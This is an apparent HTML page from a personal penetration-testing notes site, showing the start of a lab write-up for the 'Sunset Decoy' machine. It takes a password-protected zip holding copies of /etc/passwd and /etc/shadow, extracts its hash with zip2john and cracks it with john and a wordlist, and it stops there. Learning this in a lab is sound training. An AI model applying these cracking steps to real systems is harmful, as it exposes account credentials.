@@ -1,0 +1,531 @@
+<!doctype html>
+<html class="no-js" lang="en" data-content_root="">
+  <head><meta charset="utf-8"/>
+    <meta name="viewport" content="width=device-width,initial-scale=1"/>
+    <meta name="color-scheme" content="light dark"><meta name="viewport" content="width=device-width, initial-scale=1" />
+
+    <!-- Google tag (gtag.js) -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-2TCTE0JE23"></script>
+    <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+        gtag('config', 'G-2TCTE0JE23');
+    </script>
+        <link href="../../_static/lazer_fox.png" sizes="300x300" rel="icon" type="image/png"><link rel="index" title="Index" href="../../genindex.html" /><link rel="search" title="Search" href="../../search.html" /><link rel="next" title="DVWA" href="../../dvwa/dvwa.html" /><link rel="prev" title="Ha Natraj" href="../ha_natraj/ha_natraj.html" />
+
+    <!-- Generated with Sphinx 7.1.2 and Furo 2023.08.19 -->
+        <title>Sunset Decoy - blnkn&#39;s notes</title>
+      <link rel="stylesheet" type="text/css" href="../../_static/pygments.css?v=a746c00c" />
+    <link rel="stylesheet" type="text/css" href="../../_static/styles/furo.css?v=135e06be" />
+    <link rel="stylesheet" type="text/css" href="../../_static/styles/furo-extensions.css?v=36a5483c" />
+    
+    
+
+
+<style>
+  body {
+    --color-code-background: #f8f8f8;
+  --color-code-foreground: black;
+  
+  }
+  @media not print {
+    body[data-theme="dark"] {
+      --color-code-background: #202020;
+  --color-code-foreground: #d0d0d0;
+  
+    }
+    @media (prefers-color-scheme: dark) {
+      body:not([data-theme="light"]) {
+        --color-code-background: #202020;
+  --color-code-foreground: #d0d0d0;
+  
+      }
+    }
+  }
+</style></head>
+  <body>
+    
+    <script>
+      document.body.dataset.theme = localStorage.getItem("theme") || "auto";
+    </script>
+    
+
+<svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
+  <symbol id="svg-toc" viewBox="0 0 24 24">
+    <title>Contents</title>
+    <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 1024 1024">
+      <path d="M408 442h480c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8H408c-4.4 0-8 3.6-8 8v56c0 4.4 3.6 8 8 8zm-8 204c0 4.4 3.6 8 8 8h480c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8H408c-4.4 0-8 3.6-8 8v56zm504-486H120c-4.4 0-8 3.6-8 8v56c0 4.4 3.6 8 8 8h784c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8zm0 632H120c-4.4 0-8 3.6-8 8v56c0 4.4 3.6 8 8 8h784c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8zM115.4 518.9L271.7 642c5.8 4.6 14.4.5 14.4-6.9V388.9c0-7.4-8.5-11.5-14.4-6.9L115.4 505.1a8.74 8.74 0 0 0 0 13.8z"/>
+    </svg>
+  </symbol>
+  <symbol id="svg-menu" viewBox="0 0 24 24">
+    <title>Menu</title>
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+      stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather-menu">
+      <line x1="3" y1="12" x2="21" y2="12"></line>
+      <line x1="3" y1="6" x2="21" y2="6"></line>
+      <line x1="3" y1="18" x2="21" y2="18"></line>
+    </svg>
+  </symbol>
+  <symbol id="svg-arrow-right" viewBox="0 0 24 24">
+    <title>Expand</title>
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+      stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather-chevron-right">
+      <polyline points="9 18 15 12 9 6"></polyline>
+    </svg>
+  </symbol>
+  <symbol id="svg-sun" viewBox="0 0 24 24">
+    <title>Light mode</title>
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+      stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" class="feather-sun">
+      <circle cx="12" cy="12" r="5"></circle>
+      <line x1="12" y1="1" x2="12" y2="3"></line>
+      <line x1="12" y1="21" x2="12" y2="23"></line>
+      <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+      <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+      <line x1="1" y1="12" x2="3" y2="12"></line>
+      <line x1="21" y1="12" x2="23" y2="12"></line>
+      <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+      <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+    </svg>
+  </symbol>
+  <symbol id="svg-moon" viewBox="0 0 24 24">
+    <title>Dark mode</title>
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+      stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" class="icon-tabler-moon">
+      <path stroke="none" d="M0 0h24v24H0z" fill="none" />
+      <path d="M12 3c.132 0 .263 0 .393 0a7.5 7.5 0 0 0 7.92 12.446a9 9 0 1 1 -8.313 -12.454z" />
+    </svg>
+  </symbol>
+  <symbol id="svg-sun-half" viewBox="0 0 24 24">
+    <title>Auto light/dark mode</title>
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+      stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" class="icon-tabler-shadow">
+      <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+      <circle cx="12" cy="12" r="9" />
+      <path d="M13 12h5" />
+      <path d="M13 15h4" />
+      <path d="M13 18h1" />
+      <path d="M13 9h4" />
+      <path d="M13 6h1" />
+    </svg>
+  </symbol>
+</svg>
+
+<input type="checkbox" class="sidebar-toggle" name="__navigation" id="__navigation">
+<input type="checkbox" class="sidebar-toggle" name="__toc" id="__toc">
+<label class="overlay sidebar-overlay" for="__navigation">
+  <div class="visually-hidden">Hide navigation sidebar</div>
+</label>
+<label class="overlay toc-overlay" for="__toc">
+  <div class="visually-hidden">Hide table of contents sidebar</div>
+</label>
+
+
+
+<div class="page">
+  <header class="mobile-header">
+    <div class="header-left">
+      <label class="nav-overlay-icon" for="__navigation">
+        <div class="visually-hidden">Toggle site navigation sidebar</div>
+        <i class="icon"><svg><use href="#svg-menu"></use></svg></i>
+      </label>
+    </div>
+    <div class="header-center">
+      <a href="../../index.html"><div class="brand">blnkn's notes</div></a>
+    </div>
+    <div class="header-right">
+      <div class="theme-toggle-container theme-toggle-header">
+        <button class="theme-toggle">
+          <div class="visually-hidden">Toggle Light / Dark / Auto color theme</div>
+          <svg class="theme-icon-when-auto"><use href="#svg-sun-half"></use></svg>
+          <svg class="theme-icon-when-dark"><use href="#svg-moon"></use></svg>
+          <svg class="theme-icon-when-light"><use href="#svg-sun"></use></svg>
+        </button>
+      </div>
+      <label class="toc-overlay-icon toc-header-icon" for="__toc">
+        <div class="visually-hidden">Toggle table of contents sidebar</div>
+        <i class="icon"><svg><use href="#svg-toc"></use></svg></i>
+      </label>
+    </div>
+  </header>
+  <aside class="sidebar-drawer">
+    <div class="sidebar-container">
+      
+      <div class="sidebar-sticky"><a class="sidebar-brand" href="../../index.html">
+  
+  <div class="sidebar-logo-container">
+    <img class="sidebar-logo" src="../../_static/lazer_fox.png" alt="Logo"/>
+  </div>
+  
+  <span class="sidebar-brand-text">blnkn's notes</span>
+  
+</a><form class="sidebar-search-container" method="get" action="../../search.html" role="search">
+  <input class="sidebar-search" placeholder="Search" name="q" aria-label="Search">
+  <input type="hidden" name="check_keywords" value="yes">
+  <input type="hidden" name="area" value="default">
+</form>
+<div id="searchbox"></div><div class="sidebar-scroll"><div class="sidebar-tree">
+  <p class="caption" role="heading"><span class="caption-text">Contents:</span></p>
+<ul class="current">
+<li class="toctree-l1 has-children"><a class="reference internal" href="../../htb/htb.html">Hack The Box</a><input class="toctree-checkbox" id="toctree-checkbox-1" name="toctree-checkbox-1" role="switch" type="checkbox"/><label for="toctree-checkbox-1"><div class="visually-hidden">Toggle navigation of Hack The Box</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l2 has-children"><a class="reference internal" href="../../htb/academy/academy.html">Academy</a><input class="toctree-checkbox" id="toctree-checkbox-2" name="toctree-checkbox-2" role="switch" type="checkbox"/><label for="toctree-checkbox-2"><div class="visually-hidden">Toggle navigation of Academy</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l3 has-children"><a class="reference internal" href="../../htb/academy/active-directory/active-directory.html">Active Directory</a><input class="toctree-checkbox" id="toctree-checkbox-3" name="toctree-checkbox-3" role="switch" type="checkbox"/><label for="toctree-checkbox-3"><div class="visually-hidden">Toggle navigation of Active Directory</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l4"><a class="reference internal" href="../../htb/academy/active-directory/ad/ad.html">Active Directory</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../htb/academy/active-directory/ad/ad.html#user-account-control-values">User Account Control Values</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../htb/academy/active-directory/kerberos/kerberos.html">Kerberos</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../htb/academy/active-directory/windows-auth/windows-auth.html">Windows Authentication</a></li>
+</ul>
+</li>
+<li class="toctree-l3 has-children"><a class="reference internal" href="../../htb/academy/buffer-overflows/buffer-overflows.html">Buffer Overflows</a><input class="toctree-checkbox" id="toctree-checkbox-4" name="toctree-checkbox-4" role="switch" type="checkbox"/><label for="toctree-checkbox-4"><div class="visually-hidden">Toggle navigation of Buffer Overflows</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l4"><a class="reference internal" href="../../htb/academy/buffer-overflows/linux-buffer-overflows/linux-buffer-overflows.html">Linux Buffer Overflows</a></li>
+</ul>
+</li>
+<li class="toctree-l3"><a class="reference internal" href="../../htb/academy/hashcat/hashcat.html">Hashcat</a></li>
+<li class="toctree-l3 has-children"><a class="reference internal" href="../../htb/academy/os-fundamentals/os-fundamentals.html">OS Fundamentals</a><input class="toctree-checkbox" id="toctree-checkbox-5" name="toctree-checkbox-5" role="switch" type="checkbox"/><label for="toctree-checkbox-5"><div class="visually-hidden">Toggle navigation of OS Fundamentals</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l4"><a class="reference internal" href="../../htb/academy/os-fundamentals/windows-fundamentals/windows-fundamentals.html">Windows OS Fundamentals</a></li>
+</ul>
+</li>
+<li class="toctree-l3"><a class="reference internal" href="../../htb/academy/sqli/sqli.html">SQLi</a></li>
+<li class="toctree-l3"><a class="reference internal" href="../../htb/academy/webapp/webapp.html">Web Apps</a></li>
+</ul>
+</li>
+<li class="toctree-l2 has-children"><a class="reference internal" href="../../htb/machines/machines.html">Lab Machines</a><input class="toctree-checkbox" id="toctree-checkbox-6" name="toctree-checkbox-6" role="switch" type="checkbox"/><label for="toctree-checkbox-6"><div class="visually-hidden">Toggle navigation of Lab Machines</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l3 has-children"><a class="reference internal" href="../../htb/machines/hard/hard.html">Hard</a><input class="toctree-checkbox" id="toctree-checkbox-7" name="toctree-checkbox-7" role="switch" type="checkbox"/><label for="toctree-checkbox-7"><div class="visually-hidden">Toggle navigation of Hard</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l4"><a class="reference internal" href="../../htb/machines/hard/snoopy/snoopy.html">Snoopy</a></li>
+</ul>
+</li>
+<li class="toctree-l3 has-children"><a class="reference internal" href="../../htb/machines/medium/medium.html">Medium</a><input class="toctree-checkbox" id="toctree-checkbox-8" name="toctree-checkbox-8" role="switch" type="checkbox"/><label for="toctree-checkbox-8"><div class="visually-hidden">Toggle navigation of Medium</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l4"><a class="reference internal" href="../../htb/machines/medium/ambassador/ambassador.html">Ambassador</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../htb/machines/medium/authority/authority.html">Authority</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../htb/machines/medium/awkward/awkward.html">Awkward</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../htb/machines/medium/faculty/faculty.html">Faculty</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../htb/machines/medium/forgot/forgot.html">Forgot</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../htb/machines/medium/format/format.html">Format</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../htb/machines/medium/health/health.html">Health</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../htb/machines/medium/jupiter/jupiter.html">Jupiter</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../htb/machines/medium/manager/manager.html">Manager</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../htb/machines/medium/mentor/mentor.html">Mentor</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../htb/machines/medium/only4you/only4you.html">Only4you</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../htb/machines/medium/outdated/outdated.html">Outdated</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../htb/machines/medium/sandworm/sandworm.html">Sandworm</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../htb/machines/medium/scrambled/scrambled.html">Scrambled</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../htb/machines/medium/shared/shared.html">Shared</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../htb/machines/medium/updown/updown.html">Updown</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../htb/machines/medium/zipping/zipping.html">Zipping</a></li>
+</ul>
+</li>
+<li class="toctree-l3 has-children"><a class="reference internal" href="../../htb/machines/easy/easy.html">Easy</a><input class="toctree-checkbox" id="toctree-checkbox-9" name="toctree-checkbox-9" role="switch" type="checkbox"/><label for="toctree-checkbox-9"><div class="visually-hidden">Toggle navigation of Easy</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l4"><a class="reference internal" href="../../htb/machines/easy/analytics/analytics.html">Analytics</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../htb/machines/easy/busqueda/busqueda.html">Busqueda</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../htb/machines/easy/codify/codify.html">Codify</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../htb/machines/easy/inject/inject.html">Inject</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../htb/machines/easy/keeper/keeper.html">Keeper</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../htb/machines/easy/metatwo/metatwo.html">Meta two</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../htb/machines/easy/monitorstwo/monitorstwo.html">Monitors two</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../htb/machines/easy/pc/pc.html">Pc</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../htb/machines/easy/photobomb/photobomb.html">Photobomb</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../htb/machines/easy/pilgrimage/pilgrimage.html">Pilgrimage</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../htb/machines/easy/precious/precious.html">Precious</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../htb/machines/easy/red_panda/red_panda.html">Red panda</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../htb/machines/easy/sau/sau.html">Sau</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../htb/machines/easy/shoppy/shoppy.html">Shoppy</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../htb/machines/easy/soccer/soccer.html">Soccer</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../htb/machines/easy/stocker/stocker.html">Stocker</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../htb/machines/easy/support/support.html">Support</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../htb/machines/easy/topology/topology.html">Topology</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../htb/machines/easy/trick/trick.html">Trick</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li class="toctree-l1 current has-children"><a class="reference internal" href="../pg.html">Proving Grounds</a><input checked="" class="toctree-checkbox" id="toctree-checkbox-10" name="toctree-checkbox-10" role="switch" type="checkbox"/><label for="toctree-checkbox-10"><div class="visually-hidden">Toggle navigation of Proving Grounds</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul class="current">
+<li class="toctree-l2"><a class="reference internal" href="../ha_natraj/ha_natraj.html">Ha Natraj</a></li>
+<li class="toctree-l2 current current-page"><a class="current reference internal" href="#">Sunset Decoy</a></li>
+</ul>
+</li>
+<li class="toctree-l1 has-children"><a class="reference internal" href="../../dvwa/dvwa.html">DVWA</a><input class="toctree-checkbox" id="toctree-checkbox-11" name="toctree-checkbox-11" role="switch" type="checkbox"/><label for="toctree-checkbox-11"><div class="visually-hidden">Toggle navigation of DVWA</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l2"><a class="reference internal" href="../../dvwa/sqli_blind/sqli_blind.html">Blind SQLi</a></li>
+</ul>
+</li>
+<li class="toctree-l1 has-children"><a class="reference internal" href="../../other/other.html">Other</a><input class="toctree-checkbox" id="toctree-checkbox-12" name="toctree-checkbox-12" role="switch" type="checkbox"/><label for="toctree-checkbox-12"><div class="visually-hidden">Toggle navigation of Other</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l2"><a class="reference internal" href="../../other/assembly/assembly.html">Assembly</a></li>
+<li class="toctree-l2 has-children"><a class="reference internal" href="../../other/aws-ccp/aws-ccp.html">AWS-CCP</a><input class="toctree-checkbox" id="toctree-checkbox-13" name="toctree-checkbox-13" role="switch" type="checkbox"/><label for="toctree-checkbox-13"><div class="visually-hidden">Toggle navigation of AWS-CCP</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l3"><a class="reference internal" href="../../other/aws-ccp/1-foundations-of-cloud-computing.html">Foundations of Cloud Computing</a></li>
+<li class="toctree-l3"><a class="reference internal" href="../../other/aws-ccp/2-technology.html">Technologies</a></li>
+<li class="toctree-l3"><a class="reference internal" href="../../other/aws-ccp/3-security-and-compliance.html">Security and Compliance</a></li>
+<li class="toctree-l3"><a class="reference internal" href="../../other/aws-ccp/4-pricing-billing-and-governance.html">Pricing Billing and Governance</a></li>
+</ul>
+</li>
+<li class="toctree-l2"><a class="reference internal" href="../../other/codebashing/codebashing.html">Codebashing</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../other/dba/dba.html">Database Administration</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../other/dorking/dorking.html">Google dork cheatsheet</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../other/empire/empire.html">Empire</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../other/hashes/hashes.html">Hashes</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../other/irssi/irssi.html">Irssi</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../other/metasploit/metasploit.html">Metasploit framework</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../other/nmap/nmap.html">Nmap</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../other/reconstructing-private-key/reconstructing-private-key.html">Reconstructing a Private Key</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../other/rfid/rfid.html">RFID</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../other/server-hardening/server-hardening.html">Server Hardening</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../other/shells/shells.html">Reverse Shells</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../other/stego/stego.html">Steganography</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../other/tcpdump-vuln/tcpdump-vuln.html">TCPdump</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../other/wordlists/wordlists.html">Making Custom Wordlists</a></li>
+<li class="toctree-l2 has-children"><a class="reference internal" href="../../other/c/c.html">C</a><input class="toctree-checkbox" id="toctree-checkbox-14" name="toctree-checkbox-14" role="switch" type="checkbox"/><label for="toctree-checkbox-14"><div class="visually-hidden">Toggle navigation of C</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l3"><a class="reference internal" href="../../other/c/execution-methods.html">C Execution methods</a></li>
+</ul>
+</li>
+<li class="toctree-l2"><a class="reference internal" href="../../other/air-ungap/air-ungap.html">Air-Ungap</a></li>
+</ul>
+</li>
+</ul>
+
+</div>
+</div>
+
+      </div>
+      
+    </div>
+  </aside>
+  <div class="main">
+    <div class="content">
+      <div class="article-container">
+        <a href="#" class="back-to-top muted-link">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+            <path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8v12z"></path>
+          </svg>
+          <span>Back to top</span>
+        </a>
+        <div class="content-icon-container">
+          
+<div class="theme-toggle-container theme-toggle-content">
+            <button class="theme-toggle">
+              <div class="visually-hidden">Toggle Light / Dark / Auto color theme</div>
+              <svg class="theme-icon-when-auto"><use href="#svg-sun-half"></use></svg>
+              <svg class="theme-icon-when-dark"><use href="#svg-moon"></use></svg>
+              <svg class="theme-icon-when-light"><use href="#svg-sun"></use></svg>
+            </button>
+          </div>
+          <label class="toc-overlay-icon toc-content-icon" for="__toc">
+            <div class="visually-hidden">Toggle table of contents sidebar</div>
+            <i class="icon"><svg><use href="#svg-toc"></use></svg></i>
+          </label>
+        </div>
+        <article role="main">
+          <section id="sunset-decoy">
+<h1>Sunset Decoy<a class="headerlink" href="#sunset-decoy" title="Permalink to this heading">#</a></h1>
+<section id="enum">
+<h2>Enum<a class="headerlink" href="#enum" title="Permalink to this heading">#</a></h2>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>curl<span class="w"> </span>-I<span class="w"> </span><span class="m">192</span>.168.185.85
+HTTP/1.1<span class="w"> </span><span class="m">200</span><span class="w"> </span>OK
+Date:<span class="w"> </span>Fri,<span class="w"> </span><span class="m">18</span><span class="w"> </span>Aug<span class="w"> </span><span class="m">2023</span><span class="w"> </span><span class="m">15</span>:55:20<span class="w"> </span>GMT
+Server:<span class="w"> </span>Apache/2.4.38<span class="w"> </span><span class="o">(</span>Debian<span class="o">)</span>
+Content-Type:<span class="w"> </span>text/html<span class="p">;</span><span class="nv">charset</span><span class="o">=</span>UTF-8
+</pre></div>
+</div>
+<p>There’s a link on the webapp to download a zip, it is password protected, but he password is very easy to crack</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>zip2john<span class="w"> </span>save.zip<span class="w"> </span>&gt;<span class="w"> </span>hash.txt
+ver<span class="w"> </span><span class="m">2</span>.0<span class="w"> </span>efh<span class="w"> </span><span class="m">5455</span><span class="w"> </span>efh<span class="w"> </span><span class="m">7875</span><span class="w"> </span>save.zip/etc/passwd<span class="w"> </span>PKZIP<span class="w"> </span>Encr:<span class="w"> </span>TS_chk,<span class="w"> </span><span class="nv">cmplen</span><span class="o">=</span><span class="m">668</span>,<span class="w"> </span><span class="nv">decmplen</span><span class="o">=</span><span class="m">1807</span>,<span class="w"> </span><span class="nv">crc</span><span class="o">=</span>B3ACDAFE<span class="w"> </span><span class="nv">ts</span><span class="o">=</span>90AB<span class="w"> </span><span class="nv">cs</span><span class="o">=</span>90ab<span class="w"> </span><span class="nv">type</span><span class="o">=</span><span class="m">8</span>
+ver<span class="w"> </span><span class="m">2</span>.0<span class="w"> </span>efh<span class="w"> </span><span class="m">5455</span><span class="w"> </span>efh<span class="w"> </span><span class="m">7875</span><span class="w"> </span>save.zip/etc/shadow<span class="w"> </span>PKZIP<span class="w"> </span>Encr:<span class="w"> </span>TS_chk,<span class="w"> </span><span class="nv">cmplen</span><span class="o">=</span><span class="m">434</span>,<span class="w"> </span><span class="nv">decmplen</span><span class="o">=</span><span class="m">1111</span>,<span class="w"> </span><span class="nv">crc</span><span class="o">=</span>E11EC139<span class="w"> </span><span class="nv">ts</span><span class="o">=</span>834F<span class="w"> </span><span class="nv">cs</span><span class="o">=</span>834f<span class="w"> </span><span class="nv">type</span><span class="o">=</span><span class="m">8</span>
+ver<span class="w"> </span><span class="m">2</span>.0<span class="w"> </span>efh<span class="w"> </span><span class="m">5455</span><span class="w"> </span>efh<span class="w"> </span><span class="m">7875</span><span class="w"> </span>save.zip/etc/group<span class="w"> </span>PKZIP<span class="w"> </span>Encr:<span class="w"> </span>TS_chk,<span class="w"> </span><span class="nv">cmplen</span><span class="o">=</span><span class="m">460</span>,<span class="w"> </span><span class="nv">decmplen</span><span class="o">=</span><span class="m">829</span>,<span class="w"> </span><span class="nv">crc</span><span class="o">=</span>A1F81C08<span class="w"> </span><span class="nv">ts</span><span class="o">=</span>8D07<span class="w"> </span><span class="nv">cs</span><span class="o">=</span>8d07<span class="w"> </span><span class="nv">type</span><span class="o">=</span><span class="m">8</span>
+ver<span class="w"> </span><span class="m">2</span>.0<span class="w"> </span>efh<span class="w"> </span><span class="m">5455</span><span class="w"> </span>efh<span class="w"> </span><span class="m">7875</span><span class="w"> </span>save.zip/etc/sudoers<span class="w"> </span>PKZIP<span class="w"> </span>Encr:<span class="w"> </span>TS_chk,<span class="w"> </span><span class="nv">cmplen</span><span class="o">=</span><span class="m">368</span>,<span class="w"> </span><span class="nv">decmplen</span><span class="o">=</span><span class="m">669</span>,<span class="w"> </span><span class="nv">crc</span><span class="o">=</span>FF05389F<span class="w"> </span><span class="nv">ts</span><span class="o">=</span><span class="m">1535</span><span class="w"> </span><span class="nv">cs</span><span class="o">=</span><span class="m">1535</span><span class="w"> </span><span class="nv">type</span><span class="o">=</span><span class="m">8</span>
+ver<span class="w"> </span><span class="m">2</span>.0<span class="w"> </span>efh<span class="w"> </span><span class="m">5455</span><span class="w"> </span>efh<span class="w"> </span><span class="m">7875</span><span class="w"> </span>save.zip/etc/hosts<span class="w"> </span>PKZIP<span class="w"> </span>Encr:<span class="w"> </span>TS_chk,<span class="w"> </span><span class="nv">cmplen</span><span class="o">=</span><span class="m">140</span>,<span class="w"> </span><span class="nv">decmplen</span><span class="o">=</span><span class="m">185</span>,<span class="w"> </span><span class="nv">crc</span><span class="o">=</span>DFB905CD<span class="w"> </span><span class="nv">ts</span><span class="o">=</span><span class="m">8759</span><span class="w"> </span><span class="nv">cs</span><span class="o">=</span><span class="m">8759</span><span class="w"> </span><span class="nv">type</span><span class="o">=</span><span class="m">8</span>
+ver<span class="w"> </span><span class="m">1</span>.0<span class="w"> </span>efh<span class="w"> </span><span class="m">5455</span><span class="w"> </span>efh<span class="w"> </span><span class="m">7875</span><span class="w"> </span>**<span class="w"> </span>2b<span class="w"> </span>**<span class="w"> </span>save.zip/etc/hostname<span class="w"> </span>PKZIP<span class="w"> </span>Encr:<span class="w"> </span>TS_chk,<span class="w"> </span><span class="nv">cmplen</span><span class="o">=</span><span class="m">45</span>,<span class="w"> </span><span class="nv">decmplen</span><span class="o">=</span><span class="m">33</span>,<span class="w"> </span><span class="nv">crc</span><span class="o">=</span>D9C379A9<span class="w"> </span><span class="nv">ts</span><span class="o">=</span>8CE8<span class="w"> </span><span class="nv">cs</span><span class="o">=</span>8ce8<span class="w"> </span><span class="nv">type</span><span class="o">=</span><span class="m">0</span>
+NOTE:<span class="w"> </span>It<span class="w"> </span>is<span class="w"> </span>assumed<span class="w"> </span>that<span class="w"> </span>all<span class="w"> </span>files<span class="w"> </span><span class="k">in</span><span class="w"> </span>each<span class="w"> </span>archive<span class="w"> </span>have<span class="w"> </span>the<span class="w"> </span>same<span class="w"> </span>password.
+If<span class="w"> </span>that<span class="w"> </span>is<span class="w"> </span>not<span class="w"> </span>the<span class="w"> </span><span class="k">case</span>,<span class="w"> </span>the<span class="w"> </span><span class="nb">hash</span><span class="w"> </span>may<span class="w"> </span>be<span class="w"> </span>uncrackable.<span class="w"> </span>To<span class="w"> </span>avoid<span class="w"> </span>this,<span class="w"> </span>use
+option<span class="w"> </span>-o<span class="w"> </span>to<span class="w"> </span>pick<span class="w"> </span>a<span class="w"> </span>file<span class="w"> </span>at<span class="w"> </span>a<span class="w"> </span>time.
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>john<span class="w"> </span>--wordlist<span class="o">=</span>/usr/share/wordlists/rockyou.txt<span class="w"> </span>hash.txt
+Using<span class="w"> </span>default<span class="w"> </span>input<span class="w"> </span>encoding:<span class="w"> </span>UTF-8
+Loaded<span class="w"> </span><span class="m">1</span><span class="w"> </span>password<span class="w"> </span><span class="nb">hash</span><span class="w"> </span><span class="o">(</span>PKZIP<span class="w"> </span><span class="o">[</span><span class="m">32</span>/64<span class="o">])</span>
+Will<span class="w"> </span>run<span class="w"> </span><span class="m">4</span><span class="w"> </span>OpenMP<span class="w"> </span>threads
+Press<span class="w"> </span><span class="s1">&#39;q&#39;</span><span class="w"> </span>or<span class="w"> </span>Ctrl-C<span class="w"> </span>to<span class="w"> </span>abort,<span class="w"> </span>almost<span class="w"> </span>any<span class="w"> </span>other<span class="w"> </span>key<span class="w"> </span><span class="k">for</span><span class="w"> </span>status
+m*****<span class="w">           </span><span class="o">(</span>save.zip<span class="o">)</span>
